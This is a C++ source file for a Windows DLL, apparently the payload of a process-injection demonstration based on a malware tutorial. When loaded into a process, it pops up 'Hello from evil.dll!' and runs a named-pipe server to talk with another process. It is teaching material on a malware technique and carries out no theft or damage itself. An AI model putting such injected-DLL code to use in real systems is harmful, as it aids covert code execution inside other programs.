/*
Template auhtor
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

#include "../program_result.h"
using ErrorResult = error_handling::ErrorResult;
using OkResult = error_handling::OkResult;

#include "interproc_coms.h"
using namespace process_injection;

DWORD timeout_millis = 20000;

void StartServer() {
  NamedPipeServer server = NamedPipeServer(kPipeName);
  server.CreateServer();
  error_handling::ProgramResult pr = server.WaitForConnection(timeout_millis);
  MessageBoxA(NULL, pr.GetResultInformation().c_str(), "Injection, yes!", MB_OK);
  if (pr.IsOk()) {
    server.ServerLoop();
  }
  server.CloseServer();
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    MessageBoxA(
      NULL,
      "Hello from evil.dll!",
      "Injection, yes!",
      MB_OK
    );
    StartServer();
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}

